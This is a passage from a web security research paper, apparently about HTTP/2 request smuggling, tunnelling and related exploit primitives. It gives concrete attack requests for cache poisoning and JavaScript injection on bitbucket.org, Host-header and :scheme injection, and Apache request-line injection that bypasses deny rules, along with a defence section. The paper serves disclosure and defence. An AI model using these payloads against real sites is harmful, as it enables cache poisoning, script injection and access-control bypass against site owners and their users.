You searched for cowSSLClientCipher: TLS_AES_128_GCM_SHA256,
version=TLSv1.3, bits=128Host: bitbucket.wpengine.comSSLSessionID:
X-Cluster-Client-IP: 81.132.48.250Connection: Keep-Alivecontent-
length: 7
Hitting different paths on bitbucket.org lead to my request being routed to different back-ends, and leaking
different headers:
:method PUT
:path /!api/internal/snippets
:authority bitbucket.org
... 
SSLClientCertStatus: NoClientCert 
X-Forwarded-For-Key: redacted-secret 
...
As we're only triggering a single response from the back-end, this technique works even if the request
tunnelling vulnerability is blind.
Tunnelling Exploitation: Cache Poisoning
Finally, if the stars are aligned, you might be able to use tunnelling for an extra powerful variety of web
cache poisoning. You need a scenario where you've got request tunnelling via H2.X desync, the HEAD
technique works, and there's a cache present. This will let you use HEAD to poison the cache with harmful
responses created by mixing and matching arbitrary headers and bodies.
After a little digging, I found that fetching /wp-admin triggered a redirect which reflected user input inside
the Location header without encoding it. By itself, this is completely harmless - the Location header doesn't
need HTML encoding. However, by pairing it with response headers from /blog/404, I could trick browsers
into rendering it, and executing arbitrary JavaScript:
:method HEAD
:path /blog/?x=dontpoisoneveryone
:authority bitbucket.org
foo bar 
Host: x 
GET /wp-admin? HTTP/1.1 
Host: bitbucket.wpengine.com 
HTTP/1.1 404 Not Found 
Content-Type: text/html 
X-Cache-Info: cached 
Content-Length: 5891 
HTTP/1.1 301 Moved Permanently 
Location: https://bitbucket.org/wp-admin/?
Using this technique, after six months of working on an apparently-useless vulnerability, I gained persistent
control over every page on bitbucket.org
HTTP/2 Exploit Primitives
Next up, let's take a look at some HTTP/2 exploit primitives. This section is light on full case-studies, but
each of these is based on behavior I've observed on real websites, and will grant you some kind of foothold
on the target.
Ambiguity and HTTP/2
In HTTP/1, duplicate headers are useful for a range of attacks, but it's impossible to send a request with
multiple methods or paths. HTTP/2's decision to replace the request line with pseudo-headers means this is
now possible. I've observed real servers that accept multiple :path headers, and server implementations are
inconsistent in which :path they process:
:method GET
:path /some-path
:path /different-path
:authority example.com
Also, although HTTP/2 introduces the :authority header to replace the Host header, the Host header is
technically still allowed. In fact, as I understand it, both are optional. This creates ample opportunity for
Host-header attacks such as:
:method GET
:path /
:authority example.com
host attacker.com
URL Prefix Injection
Another HTTP/2 feature that it'd be amiss to overlook is the :scheme pseudo-header. The value of this is
meant to be 'http' or 'https', but it supports arbitrary bytes.
Some systems, including Netlify, used it to construct a URL, without performing any validation. This lets
you override the path and, in some cases, poison the cache:
:method GET
:path /ffx36.js
:authority start.mozilla.org
:scheme http://start.mozilla.org/xyz?
HTTP/1.1 301 Moved Permanently 
Location:
https://start.mozilla.org/xyz?://start.mozilla.org/ffx36.js
Others use the scheme to build the URL to which the request is routed, creating an SSRF vulnerability.
Unlike the other techniques used in this paper, these exploits work even if the target isn't doing HTTP/2
downgrading.
Header Name Splitting
You'll find some servers don't let you use newlines in header names, but do allow colons. This only rarely
enables full desynchronization, due to the trailing colon appended during the downgrade:
:method GET
:path /
:authority redacted.net
transfer-encoding: chunked
GET / HTTP/1.1 
Host: redacted.net 
transfer-encoding: chunked: 
It's better suited to Host-header attacks, since the Host is expected to contain a colon, and servers often
ignore everything after the colon:
:method GET
:path /
:authority example.com
host: psres.net 443
GET / HTTP/1.1 
Host: example.com 
Host: psres.net: 443
Request Line Injection
I did find one server where header-name splitting enabled a desync. Mid-testing, the vulnerability
disappeared and the server banner reported that they'd updated their Apache front-end. In an attempt to track
down the vulnerability, I installed the old version of Apache locally. I couldn't replicate the issue, but I did
discover something else.
Apache's mod_proxy allows spaces in the :method, enabling request line injection. If the back-end server
tolerates trailing junk in the request line, this lets you bypass block rules:
Deny from all
:method GET /admin HTTP/1.1
:path /fakepath
:authority psres.net
GET /admin HTTP/1.1 /fakepath HTTP/1.1 
Host: internal-server
And escape subfolders:
ProxyPass http://internal-server.net:8080/public
:method GET / HTTP/1.1
:path /fakepath
:authority psres.net
GET / HTTP/1.1 /public/fakepath HTTP/1.1 
Host: internal-server
I reported this to Apache, and it will be patched in 2.4.49
Header Tampering Wrap
HTTP/1.1 once had a lovely feature called line folding, where you were allowed to put a \r\n followed by a
space in a header value, and the subsequent data would be 'folded' up.
Here's an identical request sent normally:
GET / HTTP/1.1 
Host: example.com 
X-Long-Header: foo bar 
Connection: close
And using line folding:
GET / HTTP/1.1 
Host: example.com 
X-Long-Header: foo 
 bar 
Connection: close
The feature was later deprecated, but plenty of servers still support it.
If you find a website with an HTTP/2 front-end that lets you send header names starting with a space, and a
back-end that supports line-folding, you can tamper with other headers, including internal ones. Here's an
example where I've tampered with the internal header request-id, which is harmless, but helpfully reflected
by the back-end:
:method GET
:path /
:authority redacted.net
 poison x
user-agent burp
GET / HTTP/1.1 
Host: redacted.net 
Request-Id: 1-602d2c4b-7c9a1f0f7 
 poison: x
User-Agent: burp 
â€¦
HTTP/1.1 200 OK 
Content-Type: text/html; charset=utf-8 
Content-Length: 3705 
Request-Id: 1-602d2c4b-7c9a1f0f7 poison: x 
Many front-ends don't sort incoming headers, so you'll find that by moving the space-header around, you can
tamper with different internal and external headers.
Essential Information
Before we wrap up, let's take a look at some of the pitfalls and challenges you're likely to encounter when
exploiting HTTP/2.
Hidden HTTP/2
As HTTP/2 and HTTP/1 share the same TCP port, clients need some way to determine which protocol to
speak. When using TLS, most clients default to HTTP/1, and only use HTTP/2 if the server explicitly
advertises support for HTTP/2 via the ALPN field during the TLS handshake. Some servers that support
HTTP/2 forget to advertise this fact, leading to clients only speaking HTTP/1 with them, and hiding valuable
attack surface.
Fortunately, this is easy to detect - simply ignore the ALPN and try to send an HTTP/2 request regardless.
You can scan for this scenario using HTTP Request Smuggler, Burp Scanner, or even curl:
curl --http2 --http2-prior-knowledge https://github.ford.com/
Connection
HTTP/2 puts a lot of effort into supporting multiple requests over a single connection. However, there are a
couple of common implementation quirks to be wary of.
Some servers treat the first request on each connection differently, which can lead to vulnerabilities
appearing intermittent or even being missed entirely. On other servers, sometimes a request will corrupt a
connection without causing the server to tear it down, silently influencing how all subsequent requests get
processed.
If you observe either of these problems, you can mitigate them using the 'Disable HTTP/2 connection reuse'
option in Burp Repeater, and the requestsPerConnection setting in Turbo Intruder.
Tooling
The tooling situation is a mess. HTTP/2's binary format means you can't use classic general-purpose tools
like netcat and openssl. HTTP/2's complexity means you can't easily implement your own client, so you'll
need to use a library. Existing libraries don't give users the essential ability to send malformed requests. This
rules out curl, too.
To make this research possible, I coded my own stripped-down, open-source HTTP/2 stack from scratch. I've
integrated this into Turbo Intruder - you can invoke it using engine=Engine.HTTP2. It takes HTTP/1.1-
formatted requests as input, then rewrites them as HTTP/2. During the rewrite, it performs a few character
mappings on the headers to ensure all the techniques used in this presentation are possible:
^ -> \r 
~ -> \n 
` -> : 
Turbo Intruder's HTTP/2 stack is not currently very tolerant of unusual server behavior. If you find it doesn't
work on a target, I'd suggest trying Burp Suite's native HTTP/2 stack. This is more battle-tested, and you can
invoke it from Turbo Intruder via Engine.BURP2.
To help you scan for these vulnerabilities, I've released a major update to HTTP Request Smuggler. This tool
found all the case studies mentioned in this paper.
Finally, I've helped integrate support for these techniques directly into Burp Suite - for further information
there, please refer to the documentation.
Defence
If you're setting up a web application, avoid HTTP/2 downgrading - it's the root cause of most of these
vulnerabilities. Instead, use HTTP/2 end to end.
If you're coding an HTTP/2 server, especially one that supports downgrading, enforce the charset limitations
present in HTTP/1 - reject requests that contain newlines in headers, colons in header names, spaces in the
request method, etc. Also, be aware that the specification isn't always explicit about where vulnerabilities
may arise. Certain unmarked requirements, if skipped, will leave you with a functional server with a critical
vulnerability. There are probably some hardening opportunities in the RFC, too.
Web developers are advised to shed assumptions inherited from HTTP/1. It's historically been possible to get
away without performing extensive validation on certain user inputs like the request method, but HTTP/2
changes this.
Further Reading
I've designed a Web Security Academy topic on this research, with multiple labs to help you consolidate your
understanding and gain practical experience exploiting real websites.
For an alternative perspective on HTTP/2 powered request smuggling, I recommend Emil Lerner's HTTP
Request Smuggling via Higher HTTP Versions14.
For a better explanation of HTTP Response Queue Poisoning, check out @defparam's Practical Attacks
Using HTTP Request Smuggling15
Conclusion
We've seen that HTTP/2's complexity has contributed to server implementation shortcuts, inadequate
offensive tooling, and poor risk awareness.
Through novel tooling and research, I've shown that many websites suffer from serious HTTP/2 request
smuggling vulnerabilities thanks to widespread HTTP/2 downgrading. I've also shown that, aside from
request smuggling, HTTP/2's power and flexibility enable a broad range of other attacks not possible with
HTTP/1.
Finally, I've introduced techniques that make request tunneling practical to detect and exploit, particularly in
the presence of HTTP/2.
References
1. https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#detect
2. https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface
3. https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
4. https://portswigger.net/web-security/request-smuggling
5. https://datatracker.ietf.org/doc/html/rfc7540
6. https://github.com/Netflix/zuul
7. https://netty.io/
8. https://github.com/netty/netty/security/advisories/GHSA-wm47-8v5p-wjpj
9. https://portswigger.net/research/http2-the-sequel-is-always-worse
10. https://youtu.be/3tpnuzFLU8g
11. https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44790/
12. https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-
h2c
13. https://github.com/PortSwigger/param-miner
14. https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-
versions/
15. https://youtu.be/3tpnuzFLU8g